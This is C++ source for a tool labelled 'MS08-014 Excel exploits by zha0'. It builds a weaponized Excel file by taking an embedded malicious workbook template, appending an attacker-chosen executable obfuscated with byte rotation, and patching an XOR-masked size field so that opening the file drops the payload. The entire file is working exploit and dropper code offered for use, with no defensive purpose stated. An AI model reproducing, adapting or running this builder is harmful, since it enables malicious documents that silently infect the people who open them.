// ms08_014.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

BOOL EncodeSrc(PCHAR src, int size)
{
	//unsigned char c;
	for ( int i = 0; i < size; i++ )
	{
		__asm
		{
			pushad
			xor		eax, eax
			mov		ebx, src[0]
			mov		ecx, i
			mov		al, byte ptr [ebx+ecx]
			ror		al, 1
			ror		al, 1
			ror		al, 1
			mov		byte ptr [ebx+ecx], al
			popad
		}
	}

	return TRUE;
}

BOOL Generate(char *drop, char *src)
{

	PBYTE	pDrp;
	HANDLE	hDrp, hDrpMap;

	PBYTE	pSrc, pHeap;
	HANDLE	hSrc, hSrcMap;

	DWORD	Size;

	HRSRC	aResourceH;
	HGLOBAL	aResourceHGlobal;
	unsigned char *aFilePtr;
	unsigned long aFileSize;

	aResourceH = FindResource(NULL, MAKEINTRESOURCE(102), "MS08014");

	if (!aResourceH)
		return FALSE;

	aResourceHGlobal = LoadResource(NULL, aResourceH);

    if (!aResourceHGlobal)
		return FALSE;

	aFileSize = SizeofResource(NULL, aResourceH);

	aFilePtr = (unsigned char *) LockResource(aResourceHGlobal);

	if(!aFilePtr)
		return FALSE;

	if ((hSrc = CreateFile(src, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, 0) ) == INVALID_HANDLE_VALUE)
		return FALSE;

	Size = GetFileSize(hSrc, NULL);

	if ((hSrcMap = CreateFileMapping(hSrc, NULL, PAGE_READWRITE, 0, Size, NULL)) == NULL)
	{
		CloseHandle(hSrc);
		return FALSE;
	}

	if ((pSrc = (PBYTE) MapViewOfFile(hSrcMap, FILE_MAP_ALL_ACCESS, 0, 0, Size)) == NULL)
	{
		CloseHandle(hSrcMap);
		CloseHandle(hSrc);
		return FALSE;
	}

	pHeap = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	CopyMemory(pHeap, pSrc, Size);

	EncodeSrc((PCHAR) pHeap, Size);

	if (( hDrp = CreateFile(drop, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL) ) == INVALID_HANDLE_VALUE)
		return FALSE;

	if ((hDrpMap = CreateFileMapping(hDrp, NULL, PAGE_READWRITE, 0, aFileSize + Size, NULL)) == NULL)
	{
		CloseHandle(hDrp);	
		return FALSE;
	}

	if ((pDrp = (PBYTE) MapViewOfFile(hDrpMap, FILE_MAP_ALL_ACCESS, 0, 0, aFileSize + Size)) == NULL)
	{
		CloseHandle(hSrcMap);
		CloseHandle(hSrc);
		return FALSE;
	}

	CopyMemory(pDrp, aFilePtr, aFileSize);
	CopyMemory(pDrp + aFileSize, pHeap, Size);

	Size = Size ^ 0xDEDEDEDE; //	Size = 0xFFFFFFFF;
	CopyMemory(pDrp + aFileSize - 0x2EB + 0x46, &Size, 4);

	HeapFree(GetProcessHeap(), NULL, pHeap);

	UnmapViewOfFile(pDrp);
	CloseHandle(hDrpMap);
	CloseHandle(hDrp);
	
	UnmapViewOfFile(pSrc);
	CloseHandle(hSrcMap);
	CloseHandle(hSrc);

	return TRUE;
}

int main(int argc, char* argv[])
{

	printf("\nMS08-014 Excel exploits by zha0\n\n");
	
	if ( argc < 3 )
	{
		printf("Usage : \n\r\t%s explfile exefile", argv[0]);
		exit(-1);
	}

	if ( !PathFileExists(argv[2]) )
	{
		printf("\n%s must already exist!", argv[2]);
		exit(-1);
	}

	if ( Generate(argv[1], argv[2]) )
	{
		printf("\nGenerating %s exploits file!!", argv[1]);
	}

	return 0;
}
